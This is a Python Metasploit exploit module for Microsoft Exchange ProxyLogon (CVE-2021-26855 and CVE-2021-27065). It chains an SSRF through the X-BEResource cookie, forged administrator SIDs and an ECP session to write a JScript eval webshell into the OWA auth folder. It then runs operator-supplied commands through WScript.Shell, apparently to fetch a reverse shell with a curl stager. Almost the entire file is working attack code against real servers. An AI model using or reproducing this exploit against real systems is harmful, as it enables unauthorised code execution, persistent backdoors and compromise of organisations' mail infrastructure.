#!/usr/bin/env python3
from metasploit import module

dependencies_missing = False
try:
    import random, string, requests,time
    from urllib3.exceptions import InsecureRequestWarning

except ImportError:
    dependencies_missing = True

metadata = {
    'name': 'Microsoft Exchange 2019 - SSRF to Arbitrary File Write (Proxylogon)',
    'description': '''
    CVE-2021-26855 proxyLogon exchange ssrf to arbitrary file write metasploit exploit script
    ''',
    'authors': ["Taroballz", "ITRI-PTTeam"],
    'references': [
        {"type": "edb", "ref": "49637"},
        {"type": "cve", "ref": "2021-26855"},
        {"type": "cve", "ref": "2021-27065"}
    ],
    'date': "2021-03-17",
    "type": "remote_exploit_cmd_stager",
    "targets": [
        {"platform": "win", 'arch': "x86"},
        {"platform": "win", 'arch': "x64"},
    ],
    "payload": {
        "command_stager_flavor": "curl",
    },
    "privileged": False,
    "options": {
        'rhost': {'type': 'address', 'description': "Target address", 'required': True, 'default': None},
        "port": {"type": "int", "description": "port", "required": True, "default": 443},
        'rssl': {"type": "bool", "description": "Negotiate SSL for outgoing connections", "required": True,
                 "default": True},
        'rvalid_user': {"type": "string", "description": "valid user for exchange", "required": True, "default": 'administrator'},
        'rvalid_mail': {"type": "string", "description": "valid mail for exchange", "required": False, "default": None},
        "command": {"type": "string", 'description': 'The command to execute via the q GET parameter', 'required': True}
    }
}


def id_generator(size=6, chars=None):
    if chars is None:
        chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(size))

random_str = ''.join(random.sample(string.ascii_letters + string.digits, 18))
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
random_name = id_generator(3) + ".js"

# shell_content = '<script language="JScript" runat="server"> function Page_Load(){/**/eval(Request["exec_code"],"unsafe");}</script>'
# legacyDnPatchByte = "68747470733a2f2f696d6775722e636f6d2f612f7a54646e5378670a0a0a0a0a0a0a0a"
shell_content = '<script language="JScript" runat="server"> function Page_Load(){/**/eval(Request["code"],' \
                '"unsafe");}</script> '

shell_path = "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\" + random_str + ".aspx"
shell_absolute_path = "\\\\127.0.0.1\\c$\\%s" % shell_path
shell_url = ""


def get_FQDN(sURL):
    try:
        res = requests.Session()
        req = res.post(sURL + '/owa/auth.owa', verify=False)
        if not req.status_code == 400:
            module.log('Can not get FQDN!', "error")
            return None

        FQDN = req.headers["X-FEServer"]
        module.log("Getting FQDN Name: " + FQDN, "good")
        return FQDN

    except Exception as e:
        module.log(str(e), "error")


def reqAutodiscover(sURL, FQDN, mailValid,userValid):
    try:
        headers_for_autodiscover = {
            "User-Agent": user_agent,
            "Cookie": "X-BEResource={FQDN}/autodiscover/autodiscover.xml?a=~1942062522;".format(FQDN=FQDN),
            "Connection": "close",
            "Content-Type": "text/xml"
        }

        res = requests.Session()
        req = res.post(sURL + '/ecp/' + random_name, headers=headers_for_autodiscover, verify=False)
        # module.log(req.text)

        # check host/url can be vuln
        if req.status_code != 200:
            module.log("Autodiscover Error!     Maybe not vul", 'error')
            return None

        # find domainName to join email
        domainName = get_domainName(req)
        mail_host = domainName[domainName.find(".") + 1:]

        if mailValid == "" and userValid != "":
            mailValid = userValid + "@" + mail_host
        module.log("Check mail: "+mailValid,"info")
        res.close()

        # Vefiy E-mail is valid
        autoDiscoverBody = """<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
            <Request>
              <EMailAddress>{Email}</EMailAddress>
              <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
            </Request>
        </Autodiscover>
        """.format(Email=mailValid)

        req = res.post(sURL + '/ecp/' + random_name, headers=headers_for_autodiscover,data=autoDiscoverBody, verify=False)
        if "<LegacyDN>" not in req.text or "The email address can't be found." in req.text:
            module.log("Can not get LegacyDN!, mailName maybe wrong!","error")
            return

        # get legacyDN
        legacyDN = get_legacyDN(req)

        # get guestSid
        guestSID = get_guestSid(req)

        # get mailBoxID
        mailBoxId = get_mailBoxId(req)

        return {"legacyDN":legacyDN,"guestSID":guestSID,"mailBoxId":mailBoxId}


    except Exception as e:
        module.log(str(e), "error")


def get_domainName(req):
    domainName = req.headers["X-CalculatedBETarget"].split(',')[1]
    module.log("Domain Name: " + domainName, "good")
    return domainName

def get_guestSid(req):
    try:
        guestSid =req.headers["Set-Cookie"].split('X-BackEndCookie=')[1].split(';')[0]
        module.log("Guest SID: " + guestSid, "good")
        return guestSid
    except Exception as e:
        module.log("get guest SID error:"+str(e),"error")
        return None

def get_legacyDN(req):
    legacyDn = req.text.split("<LegacyDN>")[1].split("</LegacyDN>")[0]
    # legacyDN = re.findall('(?:<LegacyDN>)(.+?)(?:</LegacyDN>)', txtstr)
    module.log("Got DN: " + legacyDn,"good")
    return legacyDn

def get_mailBoxId(req):
    MailBoxId = req.text.split('<Server>')[1].split('</Server>')[0]
    module.log("Got MailBoxId: " + MailBoxId)
    return MailBoxId


def MapiRequest(sURL,autodiscoverInfo,FQDN):
    headers_for_mapi = {
        "User-Agent": user_agent,
        "Cookie": "X-BEResource=Administrator@{FQDN}:444/mapi/emsmdb?MailboxId={ID}&a=~1942062522;".format(FQDN=FQDN, ID=autodiscoverInfo["mailBoxId"]), # TODO:verify
        "Content-Type": "application/mapi-http",
        "X-Requesttype": "Connect",
        "X-Clientinfo": "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}",
        "X-Clientapplication": "Outlook/15.0.4815.1002",
        "X-Requestid": "{C715155F-2BE8-44E0-BD34-2960067874C8}:2",  # TODO:verify
    }

    mapi_body = autodiscoverInfo["legacyDN"] + "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"

    try:
        req = requests.post(sURL + '/ecp/' + random_name, headers=headers_for_mapi, data=mapi_body, verify=False)

        if req.status_code != 200 or "act as owner of a UserMailbox" not in req.text:
            module.log("Mapi Error!","error")
            return None

        sid = req.text.split("with SID ")[1].split(" and MasterAccountSid")[0]
        module.log("Got User SID: " + sid,"good")
        rtmpsid = sid[sid.rfind("-") + 1:]

        if rtmpsid != '500':
            ltmpsid = sid[:sid.rfind("-") + 1]
            sid = ltmpsid + '500'
            module.log("Fixed User SID: " + sid,"good")

        return sid

    except Exception as e:
        module.log(str(e), "error")
        return None



def ProxyLogonRequest(sURL,FQDN,sid):
    headers_for_proxylogon = {
        "Cookie": "X-BEResource=Administrator@{FQDN}:444/ecp/proxyLogon.ecp?a=~1942062522;".format(FQDN=FQDN),
        "Content-Type": "text/xml",
        "msExchLogonAccount": "S-1-5-21-3257950196-2120074785-2454614602-500",
        "msExchLogonMailbox": "S-1-5-20",
        # "msExchTargetmailbox": "micle@mit.loc",
        # "X-vDirObjectId": "S-1-5-21-3257950196-2120074785-2454614602-500",
        "User-Agent": user_agent
    }

    # proxyLogon_request = """<r at="Negotiate" ln="john"><s>{SID}</s></r>""".format(SID=sid) # TODO:verify
    proxyLogon_request = """<r at="Negotiate" ln="john"><s>{SID}</s><s a="7" t="1">S-1-1-0</s><s a="7" t="1">S-1-5-2</s><s a="7" t="1">S-1-5-11</s><s a="7" t="1">S-1-5-15</s><s a="3221225479" t="1">S-1-5-5-0-6948923</s></r>""".format(SID=sid)

    try:
        # res = requests.session()
        req = requests.post(sURL + '/ecp/' + random_name, headers=headers_for_proxylogon, data=proxyLogon_request,verify=False)
        # print(req.headers)
        if req.status_code != 241 or not "set-cookie" in req.headers:
        # if req.status_code != 241 or not "msExchEcpCanary" in req.headers["Set-Cookie"]:
            module.log("Proxylogon Error!","error")
            return None

        sess_id = req.headers['set-cookie'].split("ASP.NET_SessionId=")[1].split(";")[0]

        msExchEcpCanary = req.headers['set-cookie'].split("msExchEcpCanary=")[1].split(";")[0]

        module.log("Got session id: " + sess_id,"good")
        module.log("Got canary: " + msExchEcpCanary,"good")

        return {"sessionId":sess_id,"canary":msExchEcpCanary}

    except Exception as e:
        module.log(str(e), "error")
        return None




def uploadWebshell2(sURL,FQDN,proxyLogon_info):
    ct = requests.post("%s/ecp/%s" % (sURL, random_name), headers={
        "Cookie": "X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory"
                  "&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
                      FQDN, proxyLogon_info["canary"], proxyLogon_info["sessionId"], proxyLogon_info["canary"]),
        "Content-Type": "application/json; ",
        "msExchLogonMailbox": "S-1-5-20",
        "User-Agent": user_agent

    },
                       json={"filter": {
                           "Parameters": {
                               "__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                               "SelectedView": "", "SelectedVDirType": "All"}}, "sort": {}},
                       verify=False,
                       )

    if ct.status_code != 200:
        module.log("GetOAB Error!","error")
        return None
    elif "RawIdentity" not in ct.text:
        module.log("GetOAB Error!","error")
        return None

    oabId = str(ct.content).split('"RawIdentity":"')[1].split('"')[0]
    module.log("Got OAB id","info")
    module.log("OAB : " + oabId,"good")


    oab_json = {"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": oabId},
                "properties": {
                    "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                                   "ExternalUrl": "http://ffff/#%s" % shell_content}}}

    ct = requests.post("%s/ecp/%s" % (sURL, random_name), headers={
        "Cookie": "X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
            FQDN, proxyLogon_info["canary"], proxyLogon_info["sessionId"], proxyLogon_info["canary"]),
        "msExchLogonMailbox": "S-1-5-20",
        "Content-Type": "application/json; charset=utf-8",
        "User-Agent": user_agent
    },
                       json=oab_json,
                       verify=False,
                       )
    if ct.status_code != 200:
        module.log("Set external url Error!","error")
        return None

    reset_oab_body = {
        "identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": oabId},
        "properties": {
            "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                           "FilePathName": shell_absolute_path}}}

    ct = requests.post("%s/ecp/%s" % (sURL, random_name), headers={
        "Cookie": "X-BEResource=Administrator@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
            FQDN, proxyLogon_info["canary"], proxyLogon_info["sessionId"], proxyLogon_info["canary"]),
        "msExchLogonMailbox": "S-1-5-20",
        "Content-Type": "application/json; charset=utf-8",
        "User-Agent": user_agent
    },
                       json=reset_oab_body,
                       verify=False,
                       )

    if ct.status_code != 200:
        module.log("Got shell failure ! ","error")
        return None

    module.log("upload shell success","good")
    return "success"


def uploadWebshell(sURL,FQDN,proxyLogon_info):
    # Step 1
    headers_for_step1 = {
        "Cookie": "X-BEResource=Administrator@{FQDN}:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary={msExchEcpCanary}&a=~1942062522; ASP.NET_SessionId={SESSION}; msExchEcpCanary={msExchEcpCanary}".format(
            FQDN=FQDN, SESSION=proxyLogon_info["sessionId"], msExchEcpCanary=proxyLogon_info["canary"]),
        "Content-Type": "application/json; charset=utf-8",
        "msExchLogonMailbox": "S-1-5-20",
        "User-Agent": user_agent
    }

    json_for_step1 = {
        "filter": {
            "Parameters": {
                "__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                "SelectedView": "", "SelectedVDirType": "All"
            }
        },
        "sort": {}
    }

    try:
        # 1
        req = requests.post(sURL + '/ecp/' + random_name, headers=headers_for_step1, json=json_for_step1, verify=False)

        # print(req.text)
        if req.status_code != 200:
            module.log("GetOAB Error!",'error')
            return None

        oabId = req.text.split('"RawIdentity":"')[1].split('"')[0]
        module.log("Got OAB id: " + oabId,'good')

        # Step 2
        headers_for_upload1 = {
            "Cookie": "X-BEResource=Administrator@{FQDN}:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary={msExchEcpCanary}&a=~1942062522; ASP.NET_SessionId={SESSION}; msExchEcpCanary={msExchEcpCanary}".format(
                FQDN=FQDN, SESSION=proxyLogon_info["sessionId"], msExchEcpCanary=proxyLogon_info["canary"]),
            "Content-Type": "application/json; charset=utf-8",
            "msExchLogonMailbox": "S-1-5-20",
            "User-Agent": user_agent
        }

        json_for_upload1 = {
            "identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": oabId},
            "properties": {
                "Parameters": {
                    "__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                    "ExternalUrl": "http://test/#{SHELLPATH}".format(SHELLPATH=shell_content)}}}

        # upload1
        req = requests.post(sURL + '/ecp/' + random_name, headers=headers_for_upload1, json=json_for_upload1,
                            verify=False)
        # print(req.text)
        if req.status_code != 200:
            module.log("Set external url Error!","error")
            return None
        module.log("Set external url Success!","good")

        # upload2
        headers_for_upload2 = {
            "Cookie": "X-BEResource=Admin@{FQDN}:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary={msExchEcpCanary}&a=~1942062522; ASP.NET_SessionId={SESSION}; msExchEcpCanary={msExchEcpCanary}".format(
                FQDN=FQDN, SESSION=proxyLogon_info["sessionId"], msExchEcpCanary=proxyLogon_info["canary"]),
            "Content-Type": "application/json; charset=utf-8",
            "msExchLogonMailbox": "S-1-5-20",
            "User-Agent": user_agent
        }

        json_for_upload2 = {
            "identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": oabId},
            "properties": {
                "Parameters": {
                    "__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                    "FilePathName": shell_absolute_path}
            }
        }

        # upload2
        rep = requests.post(sURL + '/ecp/' + random_name, headers=headers_for_upload2,
                            json=json_for_upload2,
                            verify=False)

        if rep.status_code != 200:
            module.log("Write Shell Error!","error")
            return None

        module.log("Write Shell Success!","good")

        return "success"

    except Exception as e:
        module.log(str(e), "error")
        return None



def verifyshell(shellURL):
    module.log("POST  shell:" + shellURL, 'good')
    module.log("request shell now", "info")
    time.sleep(10)
    data = requests.get(shellURL, verify=False)
    if data.status_code != 200:
        module.log("request shell failure ","error")
        return None
    elif "<div class=\"errorHeader\">404</div>" in data.text:
        module.log("request shell failure , 404 shell ! ","error")
        return None
    elif "OAB (Default Web Site)" in data.text:
        module.log("Got shell success","good")
        return "success"


def run(args):
    if dependencies_missing:
        module.log("Module dependencies (requests) missing, cannot continue", level="error")
        return

    # modify URL
    sURL = args['rhost']
    if sURL[-1:] == '/': sURL = sURL[:-1]
    if not sURL[:4].lower() == 'http':
        if args["rssl"] == "true":
            sURL = 'https://' + sURL + ":" + args["port"]
        else:
            sURL = "http://" + sURL + ":" + args["port"]

    module.log("ExpUrl is {}".format(sURL))

    module.log("Attacking target:" + sURL)
    module.log("=============================")

    FQDN = "EXCHANGE"
    try:
        FQDN = get_FQDN(sURL)
        if FQDN is None:
            return


        autodiscover_info = reqAutodiscover(sURL,FQDN,args["rvalid_mail"],args["rvalid_user"])

        if autodiscover_info is None or autodiscover_info["legacyDN"] is None or autodiscover_info["mailBoxId"] is None:
            return

        sid = MapiRequest(sURL,autodiscover_info,FQDN)
        if sid is None:
            return

        ProxyLogon_info = ProxyLogonRequest(sURL,FQDN,sid)
        if ProxyLogon_info is None or ProxyLogon_info["sessionId"] is None or ProxyLogon_info["canary"] is None:
            return


        global shell_url
        for upWS in [uploadWebshell2,uploadWebshell]:
            r = upWS(sURL,FQDN,ProxyLogon_info)
            if r != "success":
                continue

            ## request webshell and verify shell exist
            time.sleep(2)
            shell_url = sURL + "/owa/auth/" + random_str + ".aspx"
            result = verifyshell(shell_url)
            if result == "success":
                break
        else:
            module.log("upload shell can't be requested, please verify manually","error")
            return




    except Exception as e:
        module.log(str(e), "info")

    # download msf reverse shell code
    # module.log(args["command"])
    commandlist = args["command"].split(";")
    for c in commandlist:
        if "+x" in c:
            c = c.replace("+x", "777")
            # module.log("cmd={}".format(c))
        try:
            # module.log("?cmd={}".format(c))
            requests.post(shell_url,data={"code": "Response.Write(new ActiveXObject(\"WScript.Shell\").exec(\"{}\").StdOut.ReadAll());".format(c)},verify=False)
            time.sleep(20)
        except Exception as e:
            module.log(str(e))
    else:
        module.log("all command done")


if __name__ == '__main__':
    module.run(metadata, run)
